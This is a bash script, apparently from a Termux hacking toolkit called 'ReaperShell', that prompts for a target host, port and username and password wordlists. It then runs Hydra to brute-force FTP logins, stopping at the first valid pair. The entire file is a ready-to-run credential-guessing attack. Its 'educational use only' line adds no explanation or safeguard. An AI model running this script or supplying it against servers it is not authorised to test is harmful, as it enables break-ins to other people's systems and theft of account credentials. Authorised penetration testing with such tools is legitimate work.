#!/bin/bash
# ftp_bruteforce.sh - FTP Brute Force Script using Hydra
# Author: KERILL-REDBYTEV
# For educational use only

clear
echo "============================================"
echo "         ReaperShell - FTP BruteForce"
echo "============================================"

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "[!] Hydra not found. Installing..."
    pkg update && pkg install hydra -y
fi

# User input
read -p "[?] Enter target IP/Domain: " target
read -p "[?] Enter FTP Port [default 21]: " port
port=${port:-21}
read -p "[?] Enter username wordlist path: " userlist
read -p "[?] Enter password wordlist path: " passlist

# Validate file existence
if [ ! -f "$userlist" ]; then
    echo "[!] Userlist not found: $userlist"
    exit 1
fi
if [ ! -f "$passlist" ]; then
    echo "[!] Password list not found: $passlist"
    exit 1
fi

# Start attack
echo "[*] Starting FTP brute force on $target:$port ..."
hydra -L "$userlist" -P "$passlist" -s "$port" -f -V ftp://$target

echo
echo "[✓] Attack complete."
read -p "Press ENTER to return to menu..."